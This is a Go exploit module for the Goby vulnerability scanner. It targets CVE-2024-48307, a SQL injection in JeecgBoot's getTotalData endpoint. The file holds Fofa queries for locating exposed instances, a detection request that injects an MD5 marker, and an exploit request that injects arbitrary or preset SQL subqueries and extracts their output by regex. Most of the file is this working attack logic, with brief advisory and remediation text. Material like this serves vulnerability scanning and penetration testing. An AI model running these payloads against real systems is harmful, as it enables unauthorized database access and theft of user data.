package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "JeecgBoot /onlDragDatasetHead/getTotalData SQL Injection Vulnerability（CVE-2024-48307）",
    "Description": "<p>JeecgBoot is a low-code development platform based on BPM, supporting a front-end and back-end separation architecture. This vulnerability exists in the /onlDragDatasetHead/getTotalData component of JeecgBoot v3.7.1. Attackers can exploit the SQL injection vulnerability in the jimureport-dashboard-spring-boot-starter-1.8.1-beta.jar file to query the database, leading to database information leakage.</p>",
    "Product": "JeecgBoot",
    "Homepage": "https://github.com/jeecgboot",
    "DisclosureDate": "2024-10-31",
    "PostTime": "2024-12-04",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "(title=\"JeecgBoot 企业级低代码平台\" && body=\"JeecgBoot\") || (header=\"Strict-Transport-Security\" && body=\"/signin/static/js\")",
    "GobyQuery": "(title=\"JeecgBoot 企业级低代码平台\" && body=\"JeecgBoot\") || (header=\"Strict-Transport-Security\" && body=\"/signin/static/js\")",
    "Level": "3",
    "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database through SQL injection, potentially leading to data leakage, privilege escalation, and further attacks.</p>",
    "Recommendation": "<p>It is recommended to upgrade JeecgBoot to the latest version immediately and strictly filter and validate all input parameters to prevent SQL injection attacks. Additionally, using a Web Application Firewall (WAF) to detect and block malicious requests is advised.</p>",
    "References": [
        "https://blog.csdn.net/xc_214/article/details/144187649"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "select database(),select version(),select user()",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select database()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/jeecg-boot/drag/onlDragDatasetHead/getTotalData",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/json"
                },
                "data_type": "json",
                "data": "{\"tableName\":\"sys_user\",\"compName\":\"\",\"condition\":{\"filter\":{}},\"config\":{\"assistValue\":[],\"assistType\":[],\"name\":[{\"fieldName\":\"concat(MD5({{{rand_int}}}))\",\"fieldType\":\"string\"},{\"fieldName\":\"id\",\"fieldType\":\"string\"}],\"value\":[{\"fieldName\":\"id\",\"fieldType\":\"1\"}],\"type\":[]}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{rand_int_md5}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|define|variable|{{{fixedhostinfo}}}/jeecg-boot/drag/onlDragDatasetHead/getTotalData"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/jeecg-boot/drag/onlDragDatasetHead/getTotalData",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"tableName\":\"sys_user\",\"compName\":\"\",\"condition\":{\"filter\":{}},\"config\":{\"assistValue\":[],\"assistType\":[],\"name\":[{\"fieldName\":\"concat(0x3a,concat(0x7e7e7e,({{{payload}}}),0x7e7e7e))\",\"fieldType\":\"string\"},{\"fieldName\":\"id\",\"fieldType\":\"string\"}],\"value\":[{\"fieldName\":\"id\",\"fieldType\":\"1\"}],\"type\":[]}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~~~([\\s\\S]*?)~~~",
                "output|when|attackType=sqlpoint|{{{lastreq}}}{\"tableName\":\"sys_user\",\"compName\":\"\",\"condition\":{\"filter\":{}},\"config\":{\"assistValue\":[],\"assistType\":[],\"name\":[{\"fieldName\":\"concat(*)\",\"fieldType\":\"string\"},{\"fieldName\":\"id\",\"fieldType\":\"string\"}],\"value\":[{\"fieldName\":\"id\",\"fieldType\":\"1\"}],\"type\":[]}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2024-48307"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "JeecgBoot /onlDragDatasetHead/getTotalData SQL注入漏洞（CVE-2024-48307）",
            "Product": "JeecgBoot",
            "Description": "<p>JeecgBoot 是一款基于 BPM 的低代码开发平台，支持前后端分离架构。该漏洞存在于 JeecgBoot v3.7.1 的 /onlDragDatasetHead/getTotalData 组件中，攻击者可以通过 jimureport-dashboard-spring-boot-starter-1.8.1-beta.jar 文件利用 SQL 注入漏洞查询数据库，导致数据库信息泄露。</p>",
            "Recommendation": "<p>建议立即将 JeecgBoot 升级至最新版本，并对所有输入参数进行严格的过滤和验证，防止 SQL 注入攻击。同时，建议使用 WAF（Web 应用防火墙）来检测和阻止恶意请求。</p>",
            "Impact": "<p>该漏洞允许攻击者通过 SQL 注入获取数据库中的敏感信息，可能导致数据泄露、权限提升以及进一步的攻击。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "JeecgBoot /onlDragDatasetHead/getTotalData SQL Injection Vulnerability（CVE-2024-48307）",
            "Product": "JeecgBoot",
            "Description": "<p>JeecgBoot is a low-code development platform based on BPM, supporting a front-end and back-end separation architecture. This vulnerability exists in the /onlDragDatasetHead/getTotalData component of JeecgBoot v3.7.1. Attackers can exploit the SQL injection vulnerability in the jimureport-dashboard-spring-boot-starter-1.8.1-beta.jar file to query the database, leading to database information leakage.</p>",
            "Recommendation": "<p>It is recommended to upgrade JeecgBoot to the latest version immediately and strictly filter and validate all input parameters to prevent SQL injection attacks. Additionally, using a Web Application Firewall (WAF) to detect and block malicious requests is advised.</p>",
            "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database through SQL injection, potentially leading to data leakage, privilege escalation, and further attacks.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "rand_int": "define|variable|{{{rand|int|8}}}",
        "rand_int_md5": "define|md5|{{{rand_int}}}"
    },
    "VariablesOrder": [
        "payload",
        "rand_int",
        "rand_int_md5"
    ],
    "EditType": "fast",
    "PocId": "9975"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}